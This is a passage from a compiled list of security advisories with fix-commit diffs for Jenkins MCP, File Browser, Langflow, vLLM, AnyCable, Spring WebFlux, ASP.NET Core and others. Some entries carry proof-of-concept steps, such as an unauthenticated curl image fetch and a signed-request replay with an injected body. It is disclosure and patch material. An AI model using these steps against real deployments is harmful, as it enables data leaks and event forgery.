+  FILE src/plugin-sdk/index.ts
+  FILE src/plugin-sdk/pairing-access.ts
+FIX commit https://github.com/openclaw/openclaw/commit/bce643a0bd145d3e9cb55400af33bd1b85baeb02 status=200
+  MSG: refactor(security): enforce account-scoped pairing APIs
+  FILE package.json
+    -    "check": "pnpm format:check && pnpm tsgo && pnpm lint && pnpm lint:tmp:no-random-messaging && pnpm lint:tmp:channel-agnostic-boundaries && pnpm lint:tmp:no
+    +    "check": "pnpm format:check && pnpm tsgo && pnpm lint && pnpm lint:tmp:no-random-messaging && pnpm lint:tmp:channel-agnostic-boundaries && pnpm lint:tmp:no
+    +    "lint:auth:pairing-account-scope": "node scripts/check-pairing-account-scope.mjs",
+  FILE scripts/check-pairing-account-scope.mjs
+    +#!/usr/bin/env node
+    +import { promises as fs } from "node:fs";
+    +import path from "node:path";
+    +import { fileURLToPath } from "node:url";
+    +import ts from "typescript";
+    +const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
+    +const sourceRoots = [path.join(repoRoot, "src"), path.join(repoRoot, "extensions")];
+    +function isTestLikeFile(filePath) {
+    +  return (
+    +    filePath.endsWith(".test.ts") ||
+    +    filePath.endsWith(".test-utils.ts") ||
+    +    filePath.endsWith(".test-harness.ts") ||
+    +    filePath.endsWith(".e2e-harness.ts")
+    +  );
+    +}
+    +async function collectTypeScriptFiles(dir) {
+    +  const entries = await fs.readdir(dir, { withFileTypes: true });
+    +  const out = [];
+    +  for (const entry of entries) {
+    +    const entryPath = path.join(dir, entry.name);
+    +    if (entry.isDirectory()) {
+    +      out.push(...(await collectTypeScriptFiles(entryPath)));
+    +      continue;
+    +    }
+    +    if (!entry.isFile() || !entryPath.endsWith(".ts") || isTestLikeFile(entryPath)) {
+    +      continue;
+    +    }
+  FILE src/auto-reply/reply/commands-allowlist.ts
+  FILE src/channels/plugins/whatsapp-heartbeat.ts
+  FILE src/commands/doctor-security.ts
+  FILE src/cron/isolated-agent/delivery-target.ts
+  FILE src/discord/monitor/agent-components.ts
+  FILE src/discord/monitor/listeners.ts
+  FILE src/discord/monitor/message-handler.preflight.ts
+  FILE src/discord/monitor/native-command.ts
+  FILE src/imessage/monitor/monitor-provider.ts
+  FILE src/line/bot-handlers.ts
+  FILE src/pairing/pairing-store.test.ts
+  FILE src/pairing/pairing-store.ts
+  FILE src/plugins/runtime/index.ts
+  FILE src/plugins/runtime/types.ts
+  FILE src/security/audit-channel.ts
+  FILE src/security/dm-policy-shared.test.ts
+  FILE src/security/dm-policy-shared.ts
+  FILE src/security/fix.ts
+
+=== GHSA-mrpq-9jr3-rqq9 sev=medium pkgs=['maven:io.jenkins.plugins:mcp-server']
+src=https://github.com/jenkinsci/mcp-server-plugin cwes=['CWE-862']
+SUMMARY: Jenkins MCP Server Plugin does not perform permission checks in multiple MCP tools
+DESC: Jenkins MCP Server Plugin 0.84.v50ca_24ef83f2 and earlier does not perform permission checks in several MCP tools. This allows to do the following: - Attackers with Item/Read permission can obtain information about the configured SCM in a job despite lacking Item/Extended Read permission (`getJobScm`). - Attackers with Item/Read permission can trigger new builds of a job despite lacking Item/Build permission (`triggerBuild`). - Attackers without Overall/Read permission can retrieve the names of configured clouds (`getStatus`). MCP Server Plugin 0.86.v7d3355e6a_a_18 performs permission checks for the affected MCP tools.
+FIX commit https://github.com/jenkinsci/mcp-server-plugin/commit/59de6a268b4c6844a3a9c6c55a541de183e71a97 status=200
+  MSG: [SECURITY-3622] Missing permission checks (#58) * [SECURITY-3622] Add missing permission checks Signed-off-by: Olivier Lamy <olamy@apache.org>
+  FILE src/main/java/io/jenkins/plugins/mcp/server/extensions/DefaultMcpServer.java
+    +            job.checkPermission(Item.BUILD);
+    -        map.put(
+    -                "Defined clouds that can provide agents (any label)",
+    -                jenkins.clouds.stream()
+    -                        .filter(cloud -> cloud.canProvision(new Cloud.CloudState(null, 1)))
+    -                        .map(Cloud::getDisplayName)
+    -                        .toList());
+    +        if (Jenkins.get().hasAnyPermission(Jenkins.SYSTEM_READ)) {
+    +            map.put(
+    +                    "Defined clouds that can provide agents (any label)",
+    +                    jenkins.clouds.stream()
+    +                            .filter(cloud -> cloud.canProvision(new Cloud.CloudState(null, 1)))
+    +                            .map(Cloud::getDisplayName)
+    +                            .toList());
+    +        }
+  FILE src/main/java/io/jenkins/plugins/mcp/server/extensions/JobScmExtension.java
+    +import hudson.model.Item;
+    -            return scmItem.getSCMs().stream()
+    -                    .map(scm -> {
+    -                        Object result = null;
+    -                        if (scm.getType().equals("hudson.plugins.git.GitSCM")) {
+    -                            result = GitScmUtil.extractGitScmInfo(scm);
+    -                        }
+    -                        return result;
+    -                    })
+    -                    .filter(Objects::nonNull)
+    -                    .toList();
+    +            if (job.hasPermission(Item.EXTENDED_READ)) {
+    +                return scmItem.getSCMs().stream()
+    +                        .map(scm -> {
+    +                            Object result = null;
+  FILE src/main/java/io/jenkins/plugins/mcp/server/tool/McpToolWrapper.java
+  FILE src/test/java/io/jenkins/plugins/mcp/server/extensions/DefaultMcpServerTest.java
+
+=== GHSA-pp88-jhwj-5qh5 sev=low pkgs=['go:github.com/filebrowser/filebrowser/v2']
+src=https://github.com/filebrowser/filebrowser cwes=['CWE-863']
+SUMMARY: File Browser: Trailing-slash directory deletion leaves public shares active for recreated paths
+DESC: ## Summary File Browser v2.63.15 can leave a public directory share behind when the shared directory is deleted through a path with a trailing slash. The share cleanup path calls `DeleteWithPathPrefix(file.Path, userID)`, but the Bolt backend performs the database prefix query with the unnormalized argument before trimming the slash for boundary checks. For a stored share at `/a`, deleting `/a/` queries for paths prefixed by `/a/`, so the exact `/a` share is never loaded and never deleted. If a directory with the same path is later recreated, the stale public share becomes active again and exposes the new directory contents through the old public URL. ## Impact An authenticated user with share, download, and delete permissions can create a valid public share, delete the shared path with a trailing slash, and leave the public link in storage. The link is dormant while the path does not exist, but it exposes future content if the same path is recreated later. The final data exposure is unauthenticated through the public share URL. This bypasses the intended lifecycle cleanup around public shares and is adjacent to the recent public-share path-existence and prefix-boundary fixes. ## Reproduction The following test was run against v2.63.15, commit `be23ab3a15bf957928ecfed88de5ab67850c1b9c`. 1. Create a scoped user with share, download, and delete permissions. 2. Create `/a/old.txt` in that user's scope. 3. Store a valid public share row with `Hash: "h"`, `UserID: 1`, and `Path: "/a"`. 4. Send an authenticated delete request for `/a/` through the resource delete handler. 5. Confirm the directory is deleted. 6. Confirm share hash `h` still exists in storage. 7. Recreate `/a/future.txt`. 8. Request the public share handler at `h/` and observe that the unauthenticated response includes `future.txt`. Command used for the local proof: ```bash go test ./http -run TestValidationTrailingSlashDeleteLeavesExactDirectoryShare -count=1 -v ``` Observed result: ```text === RUN TestValidationTrailingSlashDeleteLeavesExactDirectoryShare --- PASS: TestValidationTrailingSlashDeleteLeavesExactDirectoryShare (0.03s) PASS ok github.com/filebrowser/filebrowser/v2/http 0.044s ``` ## Root cause `storage/bolt/share.go` queries the share index before normalizing the path: ```go func (s shareBackend) DeleteWithPathPrefix(pathPrefix string, userID uint) error { var links []share.Link if err := s.db.Prefix("Path", pathPrefix, &links); err != nil { ... } prefix := strings.TrimRight(pathPrefix, "/") for _, link := range links { if link.UserID != userID { continue } if link.Path != prefix && !strings.HasPrefix(link.Path, prefix+"/") { continue } ... } } ``` For `pathPrefix == "/a/"`, the database prefix query can return descendants such as `/a/child`, but it does not return the exact share path `/a`. The later `TrimRight` cannot delete the exact share because that row was not loaded from storage. `http/resource.go` passes the request-derived path into this cleanup before removing the resource: ```go file, err := files.NewFileInfo(... Path: r.URL.Path ...) ... err = d.store.Share.DeleteWithPathPrefix(file.Path, d.user.ID) ... return d.user.Fs.RemoveAll(r.URL.Path) ``` A request for `/a/` therefore removes the directory but misses the exact `/a` share row. ## Remediation Normalize the path before querying the share index, and cover both the exact normalized path and its descendants. Add regression tests where a stored share path `/a` is removed by `DeleteWithPathPrefix("/a/", userID)` and where `DELETE /api/resources/a/` deletes the exact public share row. Fixed in version 2.63.17.
+FIX commit https://github.com/filebrowser/filebrowser/commit/f30fca636c1af9ef401e9a82ff60391cb3db97e1 status=200
+  MSG: fix(share): delete exact directory share on trailing-slash delete (GHSA-pp88-jhwj-5qh5) DeleteWithPathPrefix queried the share index with the raw path, so deleting a directory through a trailing-slash
+  FILE storage/bolt/share.go
+    +	// Share paths are stored without a trailing slash
+    +	prefix := strings.TrimRight(pathPrefix, "/")
+    -	if err := s.db.Prefix("Path", pathPrefix, &links); err != nil {
+    +	if err := s.db.Prefix("Path", prefix, &links); err != nil {
+    -	prefix := strings.TrimRight(pathPrefix, "/")
+  FILE storage/bolt/share_test.go
+    +// Regression for the trailing-slash delete leaving a stale share
+    +// (GHSA-pp88-jhwj-5qh5): deleting "/a/" must remove the exact "/a" share and its
+    +// descendants, not just the descendants. Siblings and other users are untouched.
+    +func TestDeleteWithPathPrefixTrailingSlash(t *testing.T) {
+    +	t.Parallel()
+    +	s := newTestShareBackend(t)
+    +	links := []*share.Link{
+    +		{Hash: "u1-a", Path: "/a", UserID: 1},
+    +		{Hash: "u1-a-child", Path: "/a/child.txt", UserID: 1},
+    +		{Hash: "u1-abc", Path: "/abc", UserID: 1}, // sibling sharing a byte prefix
+    +		{Hash: "u2-a", Path: "/a", UserID: 2},      // other user, must remain
+    +	}
+    +	for _, l := range links {
+    +		if err := s.Save(l); err != nil {
+    +			t.Fatalf("failed to save link %s: %v", l.Hash, err)
+    +		}
+    +	}
+    +	// Delete with a trailing slash, as the resource delete handler does for a
+    +	// directory request like DELETE /api/resources/a/.
+    +	if err := s.DeleteWithPathPrefix("/a/", 1); err != nil {
+    +		t.Fatalf("DeleteWithPathPrefix returned error: %v", err)
+    +	}
+    +	got := remainingHashes(t, s)
+    +	want := []string{"u1-abc", "u2-a"}
+    +	if len(got) != len(want) {
+
+=== GHSA-2237-5r9w-vm8j sev=high pkgs=['composer:opensource-workshop/connect-cms']
+src=https://github.com/opensource-workshop/connect-cms cwes=['CWE-200']
+SUMMARY: Connect-CMS information that is restricted to viewing is visible
+DESC: ### Impact - Information that is restricted from viewing in the search results of site searches (※) can still be viewed via the main text (a feature added in v1.8.0). - Impact by version - v1.8.0 ~ v1.8.3: It will be displayed in the text. - v1.8.0 and earlier: It will not be displayed in the body of the text, but the title (frame name) will be displayed with a link. - Target viewing restriction function - Frame publishing function (private, limited publishing) - IP Restriction Page - Password setting page ### Patches (fixed version) - Apply v1.8.4. ### Workarounds - Remove the site search (e.g. hide frames).。 ### References none
+
+=== GHSA-7grx-3xcx-2xv5 sev=high pkgs=['pip:langflow']
+src=https://github.com/langflow-ai/langflow cwes=['CWE-284', 'CWE-639', 'CWE-862']
+SUMMARY: langflow has Unauthenticated IDOR on Image Downloads
+DESC: ### Summary The `/api/v1/files/images/{flow_id}/{file_name}` endpoint serves image files without any authentication or ownership check. Any unauthenticated request with a known flow_id and file_name returns the image with HTTP 200. ### Details `src/backend/base/langflow/api/v1/files.py:138-164` — `download_image` takes `flow_id`: UUID as a bare path parameter with no Depends(get_flow) or `CurrentActiveUser`. All other file routes (`download_file`, `upload_file`, `list_files`, `delete_file`) use `Depends(get_flow)` which enforces both authentication and ownership. There is no global auth middleware on /api/v1; protection is per-endpoint only. ### PoC ``` curl -v "http://localhost:7860/api/v1/files/images/<flow_uuid>/<filename.png>" # Returns HTTP 200 with image bytes, no auth header required ``` ### Impact Unauthenticated cross-tenant data leak. In a multi-tenant deployment, any attacker who can discover or guess a `flow_id` (UUIDs can be leaked through other API responses) can download any user's uploaded images without credentials.
+
+=== GHSA-2phq-3phc-84px sev=medium pkgs=['pip:vllm']
+src=https://github.com/vllm-project/vllm cwes=['CWE-639']
+SUMMARY: vLLM: Flash late-interaction scoring caches query embeddings under a caller-controlled request id — cross-request integrity break and induced errors on `/score` and `/rerank`
+DESC: ## Affected - **Ecosystem / package:** pip / `vllm` - **Affected versions:** vLLM ≤ 0.25.1 (confirmed on 0.25.1, commit [`752a3a504485`](https://github.com/vllm-project/vllm/tree/752a3a504485790a2e8491cacbb35c137339ad34)). The lower bound predates 0.25.1; maintainers can confirm how far back the flash late-interaction query cache reaches. ## Summary On late-interaction `/score` and `/rerank` deployments with flash late interaction enabled (the default for supported models), the worker caches per-request query embeddings under a key derived from the **caller-controlled** `X-Request-Id` header. A second concurrent request that reuses the victim's header value replaces the victim's cached query embedding before document scoring — so the victim's documents are scored against the **attacker's** query. Because the data-parallel router pins all requests sharing a cache key to the same engine, the collision is deterministic for an attacker who reuses the victim's `X-Request-Id`. Depending on timing, one request can also consume the shared use counter and force the other request into a late-interaction cache-miss error. This is a remotely reachable, request-controlled cross-request integrity break on the standard scoring and reranking endpoints. It requires only that flash late interaction be enabled, which is the default for supported models. ## Affected code Links pinned to the confirmed commit [`752a3a504485`](https://github.com/vllm-project/vllm/tree/752a3a504485790a2e8491cacbb35c137339ad34) (v0.25.1): - [`vllm/entrypoints/serve/engine/serving.py#L117-L124`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/entrypoints/serve/engine/serving.py#L117-L124) — `_base_request_id()` copies the public `X-Request-Id` header directly. - [`vllm/entrypoints/pooling/base/serving.py#L109`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/entrypoints/pooling/base/serving.py#L109) — the frontend request id is `f"{self.request_id_prefix}-{self._base_request_id(raw_request)}"`. - [`vllm/entrypoints/pooling/scoring/serving.py#L211`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/entrypoints/pooling/scoring/serving.py#L211) — `flash_late_interaction()` (at [L191](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/entrypoints/pooling/scoring/serving.py#L191)) derives worker cache keys directly from that id: `query_keys = [f"{ctx.request_id}-query-{i}" for i in range(n_queries)]`. - [`vllm/v1/pool/late_interaction.py#L30-L36`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/v1/pool/late_interaction.py#L30-L36) — the data-parallel routing helper pins all requests sharing a `query_key` to the same engine via `crc32(query_key)`, making collisions deterministic. - [`vllm/v1/worker/gpu/pool/late_interaction_runner.py#L95`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/v1/worker/gpu/pool/late_interaction_runner.py#L95) — the worker stores query embeddings in a process-local cache keyed only by that string: `self._query_cache[query_key] = output.clone()`. The caller-controlled header enters as the request id, and the flash late-interaction path derives the worker cache key directly from it: ```python # vllm/entrypoints/serve/engine/serving.py Lines 116-126 @staticmethod def _base_request_id( raw_request: Request | None, default: str | None = None ) -> str | None: """Pulls the request id to use from a header, if provided""" if raw_request is not None and ( (req_id := raw_request.headers.get("X-Request-Id")) is not None ): return req_id return random_uuid() if default is None else default ``` ```python # vllm/entrypoints/pooling/scoring/serving.py Lines 207-212 n_queries = ctx.n_queries n_docs = len(ctx.engine_inputs) - n_queries query_engine_inputs = ctx.engine_inputs[:n_queries] query_keys = [f"{ctx.request_id}-query-{i}" for i in range(n_queries)] query_uses = [n_docs if n_queries == 1 else 1] * n_queries ``` The worker then stores and reads the query embedding under that string with no check that the reader owns the entry — a colliding key returns another request's cached query, or (once the use counter is exhausted) raises a cache-miss error: ```python # vllm/v1/worker/gpu/pool/late_interaction_runner.py Lines 91-107 if mode == LATE_INTERACTION_MODE_CACHE_QUERY: assert query_uses is not None # `output` can be a view into the current step's hidden-states # buffer, so clone it before storing across scheduling steps. self._query_cache[query_key] = output.clone() self._query_uses[query_key] = query_uses outputs[i] = torch.zeros((), device=output.device, dtype=torch.float32) continue if mode == LATE_INTERACTION_MODE_SCORE_DOC: query_output = self._query_cache.get(query_key) if query_output is None: raise ValueError( "late-interaction query cache miss for key " f"{query_key!r}. Ensure query requests are executed " "before their paired document requests." ) ``` The bug is specific to the flash late-interaction path. Non-flash late-interaction scoring computes MaxSim directly from one request's in-memory outputs and does not create a cross-request worker cache key. ## Impact A network client of the standard scoring API can, on a flash late-interaction `/score` or `/rerank` deployment: 1. **Corrupt another user's results** — by reusing the victim's `X-Request-Id`, the attacker's query embedding overwrites the victim's cached entry, so the victim's documents are scored against the attacker's query (a cross-request integrity break). 2. **Induce errors** — depending on timing, one request consumes the shared use counter and forces the other request into a late-interaction cache-miss error. Both consequences follow deterministically from reusing the victim's header value, because same-key work is pinned to one engine. This is reachable through normal request handling and does not depend on any trus [...]
+FIX pull https://github.com/vllm-project/vllm/pull/51445 status=200
+  PR: [Frontend] Use server-generated keys for late-interaction query caches | # Use server-generated keys for late-interaction query caches ## What this fixes Flash late-interaction scoring used the caller-controlled `X-Request-Id` header in its temporary query-cache key. Two concurrent requests using the same header therefore used the same cache entry. For example, a victim and another client could both send `/score` with `X-Request-Id: shared-id`, but with different queri
+  MSG: Use server-generated keys for late-interaction query caches (#51445) Co-authored-by: Lucas Bourtoule <35483370+dhalf@users.noreply.github.com>
+  FILE tests/entrypoints/pooling/scoring/test_late_interaction_serving.py
+    +# SPDX-License-Identifier: Apache-2.0
+    +# SPDX-FileCopyrightText: Copyright contributors to the vLLM project
+    +from unittest.mock import AsyncMock, Mock
+    +import pytest
+    +from vllm.entrypoints.pooling.scoring.serving import ServingScores
+    +from vllm.entrypoints.pooling.typing import PoolingServeContext
+    +from vllm.inputs import tokens_input
+    +from vllm.pooling_params import PoolingParams
+    +def _make_context() -> PoolingServeContext:
+    +    return PoolingServeContext(
+    +        request=Mock(),
+    +        model_name="model",
+    +        request_id="score-caller-controlled-id",
+    +        pooling_params=PoolingParams(task="token_embed"),
+    +        lora_request=None,
+    +        priorities=None,
+    +        prompt_extras=None,
+    +        engine_inputs=[
+    +            tokens_input(prompt_token_ids=[1]),
+    +            tokens_input(prompt_token_ids=[2]),
+    +        ],
+    +        n_queries=1,
+    +    )
+    +def _query_key(context: PoolingServeContext) -> str:
+    +    assert context.engine_inputs is not None
+    +    pooling_params = context.engine_inputs[0]["params"]
+    +    late_interaction_params = pooling_params.late_interaction_params
+    +    assert late_interaction_params is not None
+    +    query_key = late_interaction_params.query_key
+    +    assert query_key is not None
+  FILE vllm/entrypoints/pooling/scoring/serving.py
+  FILE vllm/entrypoints/pooling/typing.py
+FIX commit https://github.com/vllm-project/vllm/commit/ee17d0d869203ef9a35ad73358a4987bba14b1fc status=200
+  (same commit message as a fix above; diff not repeated)
+
+=== GHSA-5p54-whvp-x327 sev=medium pkgs=['go:github.com/anycable/anycable']
+src=https://github.com/anycable/anycable cwes=['CWE-345']
+SUMMARY: AnyCable: Pusher REST API Does Not Verify Request Body MD5 Enabling Signed-Request Replay with Arbitrary Body
+DESC: ### Summary The Pusher-compatible REST API includes `body_md5` in the HMAC signature string but never computes or verifies the MD5 of the received HTTP body, allowing anyone who observes a signed request to replay it with an entirely different body. ### Details In `pusher/http.go`, the `Handler` function extracts `body_md5` from the URL query string (line 169) and includes it verbatim in `stringToSign` (line 175). It then verifies `HMAC(stringToSign, secret) == auth_signature`. After verification succeeds, `handleEvents` reads and parses `r.Body` (lines 201-212) without ever computing `md5(body)` and comparing it against the `body_md5` that was signed. The Pusher protocol specification explicitly requires the server to verify this digest to prevent body-substitution attacks. There is also no `auth_timestamp` staleness check, so replays are valid indefinitely. ### PoC 1. Capture a legitimate signed POST to `/apps/<app_id>/events?auth_key=K&auth_timestamp=T&auth_version=1.0&body_md5=LEGIT_MD5&auth_signature=SIG` carrying body `{"name":"safe-event","channel":"ch","data":"..."}` (e.g., from TLS-terminating load-balancer logs). 2. Send a new request with the same query string parameters but a different body: `{"name":"injected-event","channel":"admin","data":"malicious-payload"}` 3. The server accepts the request (HMAC over `stringToSign` matches the original) and broadcasts the injected event to all subscribers of `admin`. ### Impact An attacker who can read any single signed Pusher API request (from logs, a shared proxy, or a network tap) can broadcast arbitrary events to any channel indefinitely, potentially forging server-side events, corrupting application state, or delivering phishing messages to WebSocket clients. ### Fix After reading `r.Body`, compute `hex(md5(body))` and compare it to the `body_md5` query parameter using a constant-time comparison before proceeding. Additionally, reject requests whose `auth_timestamp` is more than 600 seconds from the current time.
+FIX commit https://github.com/anycable/anycable/commit/d2cbadec792f038f4695c84a65c0d957b0fde72c status=200
+  MSG: - pusher: fix handling body_md5, check auth_timestamp in REST API
+  FILE CHANGELOG.md
+    +- Pusher REST API improvements (fix body_md5 verification, verify auth_timestamp). ([@palkan][])
+    +- Upgrade to go1.26.4 tool chain.
+  FILE pusher/http.go
+    +	"crypto/md5" // #nosec G501
+    +	"time"
+    +// authTimestampGracePeriod is the maximum allowed difference between the request's
+    +// auth_timestamp and the server's current time, in seconds (matches Pusher's REST API spec).
+    +const authTimestampGracePeriod = 600
+    +	if r.Method != http.MethodPost && r.Method != http.MethodGet {
+    +		api.log.Debug("invalid request method", "method", r.Method)
+    +		w.WriteHeader(http.StatusUnprocessableEntity)
+    +		return
+    +	}
+    +	ts, err := strconv.ParseInt(authTimestamp, 10, 64)
+    +	if err != nil {
+    +		api.log.Debug("invalid auth_timestamp", "timestamp", authTimestamp)
+    +		w.WriteHeader(http.StatusUnauthorized)
+    +		return
+    +	}
+    +	if delta := time.Now().Unix() - ts; delta > authTimestampGracePeriod || delta < -authTimestampGracePeriod {
+    +		api.log.Debug("auth_timestamp out of range", "timestamp", authTimestamp, "delta", delta)
+    +		w.WriteHeader(http.StatusUnauthorized)
+    +		return
+    +	}
+    +	var body []byte
+    -	switch r.Method {
+    -	case http.MethodPost:
+    +	if r.Method == http.MethodPost {
+    +		body, err = io.ReadAll(r.Body)
+    +		if err != nil {
+    +			api.log.Error("failed to read request body")
+  FILE pusher/http_test.go
+
+=== GHSA-4hfh-6x8g-gwpp sev=medium pkgs=['maven:org.springframework:spring-webflux']
+src=https://github.com/spring-projects/spring-framework cwes=['CWE-384']
+SUMMARY: Spring Framework Escalation via Session Fixation in WebFlux
+DESC: A WebFlux application with a compromised subdomain (for example, compromised via cross-site scripting (XSS)) is vulnerable to an escalation attack exchanging a known session ID for that of an authenticated user. Affected versions: Spring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.
+FIX commit https://github.com/spring-projects/spring-framework/commit/b8ddd2c690fe3f00bb5e3d9f913a37504aab49a0 status=200
+  MSG: Avoid race in InMemoryWebSession Closes gh-36742
+  FILE spring-web/src/main/java/org/springframework/web/server/WebSession.java
+    -	/**
+    -	 * Generate a new id for the session and update the underlying session
+    -	 * storage to reflect the new id. After a successful call {@link #getId()}
+    -	 * reflects the new session id.
+    -	 * @return completion notification (success or error)
+    -	 */
+    -	Mono<Void> changeSessionId();
+    -	/**
+    -	 * Invalidate the current session and clear session storage.
+    -	 * @return completion notification (success or error)
+    -	 */
+    -	Mono<Void> invalidate();
+    +	/**
+    +	 * Generate a new id for the session and update the underlying session
+    +	 * storage to reflect the new id. After a successful call {@link #getId()}
+    +	 * reflects the new session id.
+    +	 * @return completion notification (success or error)
+    +	 */
+    +	Mono<Void> changeSessionId();
+    +	/**
+    +	 * Invalidate the current session and clear session storage.
+    +	 * @return completion notification (success or error)
+    +	 */
+    +	Mono<Void> invalidate();
+  FILE spring-web/src/main/java/org/springframework/web/server/session/InMemoryWebSessionStore.java
+    +		private final Lock lock = new ReentrantLock();
+    -		@Override
+    -		public Mono<Void> changeSessionId() {
+    -			return Mono.<Void>defer(() -> {
+    -						String currentId = this.id.get();
+    -						InMemoryWebSessionStore.this.sessions.remove(currentId);
+FIX commit https://github.com/spring-projects/spring-framework/commit/d72da90d3a562632e2b565113813f7b4a31f8717 status=200
+  (same commit message as a fix above; diff not repeated)
+
+=== GHSA-7phj-vgxq-r67h sev=medium pkgs=['nuget:Microsoft.AspNetCore.App.Runtime.win-arm64', 'nuget:Microsoft.AspNetCore.App.Runtime.win-x64', 'nuget:Microsoft.AspNetCore.App.Runtime.win-x86']
+src=https://github.com/dotnet/aspnetcore cwes=['CWE-362']
+SUMMARY: Microsoft Security Advisory CVE-2026-114157 - ASP.NET Core Security Feature Bypass Vulnerability
+DESC: ## Executive summary Microsoft is releasing this security advisory to provide information about a vulnerability in ASP.NET Core's Kestrel Named Pipes transport. This advisory provides guidance on updating affected applications and components. A Kestrel named-pipe listener configured with `CurrentUserOnly` can lose protected namespace ownership during recovery, allowing another local user to claim the pipe path. ## Announcement Announcement for this issue can be found at https://github.com/dotnet/announcements/issues/507 ## CVSS Details - **Version:** 3.1 - **Severity:** High - **Score:** 7.5 (base score) - **Vector:** `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N/E:U/RL:O/RC:C` - **Weakness:** CWE-362 - **MSRC severity:** Important - **Impact:** Security Feature Bypass ## Affected Platforms - **Platforms:** Windows - **Architectures:** Arm64, x64, x86 ## <a name="affected-packages"></a>Affected Packages Microsoft.AspNetCore.Server.Kestrel.Transport.NamedPipes ships in the ASP.NET Core shared framework and runtime packs; it is not a separately packable NuGet package. Affected intervals and patched release versions are listed below. ### .NET 8.0 - affected runtime packages Package | Affected version | Patched version --- | --- | --- [Microsoft.AspNetCore.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-arm64) | >= 8.0.0-preview.1.23112.2, <= 8.0.33 | 8.0.34 [Microsoft.AspNetCore.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x64) | >= 8.0.0-preview.1.23112.2, <= 8.0.33 | 8.0.34 [Microsoft.AspNetCore.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x86) | >= 8.0.0-preview.1.23112.2, <= 8.0.33 | 8.0.34 ### .NET 9.0 - affected runtime packages Package | Affected version | Patched version --- | --- | --- [Microsoft.AspNetCore.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-arm64) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23 [Microsoft.AspNetCore.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x64) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23 [Microsoft.AspNetCore.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x86) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23 ### .NET 10.0 - affected runtime packages Package | Affected version | Patched version --- | --- | --- [Microsoft.AspNetCore.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-arm64) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 10.0.15 [Microsoft.AspNetCore.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x64) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 10.0.15 [Microsoft.AspNetCore.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x86) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 10.0.15 ### .NET 11.0 - affected runtime packages Package | Affected version | Patched version --- | --- | --- [Microsoft.AspNetCore.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-arm64) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0 [Microsoft.AspNetCore.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x64) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0 [Microsoft.AspNetCore.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x86) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0 The .NET 11.0.0 release is fixed; affected prereleases are listed above. ## Advisory FAQ ### <a name="how-affected"></a>How do I know if I am affected? Review Windows applications that use Kestrel's Named Pipes transport and identify their deployed ASP.NET Core versions. Compare deployed versions with the affected intervals above. Self-contained applications include their own framework; updating a machine-wide installation does not replace their embedded copies. ### <a name="how-fix"></a>How do I fix the issue? Install the applicable ASP.NET Core runtime update and restart applications. Rebuild and redeploy affected self-contained applications with fixed runtime packs. An SDK update alone does not replace runtime or framework files already embedded in deployed applications. Use the patched version listed for the affected servicing line. ## Other Information ### Reporting Security Issues If you have found a potential security issue in a supported version of .NET, please report it to the Microsoft Security Response Center (MSRC) via the [MSRC Researcher Portal](https://msrc.microsoft.com/report/vulnerability/new). Further information can be found in the MSRC [Report an Issue FAQ](https://www.microsoft.com/msrc/faqs-report-an-issue). Security reports made through MSRC may qualify for the Microsoft .NET Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at https://aka.ms/corebounty. ### Support You can ask questions about this issue on GitHub in the .NET GitHub organization. The main repos are located at https://github.com/dotnet/runtime. The Announcements repo (https://github.com/dotnet/Announcements) will contain this bulletin as an issue and will include a link to a discussion issue. You can ask questions in the linked discussion issue. ### Disclaimer The information provided in this advisory is provided "as is" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exc [...]
+FIX commit https://github.com/dotnet/aspnetcore/commit/671bb7f9c84e24153ac8440e4e6de307a6cbd920 status=200
+  MSG: Merged PR 66394: [release/8.0] Update broken named pipe listener recovery path to prevent another process from using the same pipe name with a different access policy In the recovery path on IOExcepti
+  FILE src/Servers/Kestrel/Transport.NamedPipes/src/Internal/NamedPipeConnectionListener.cs
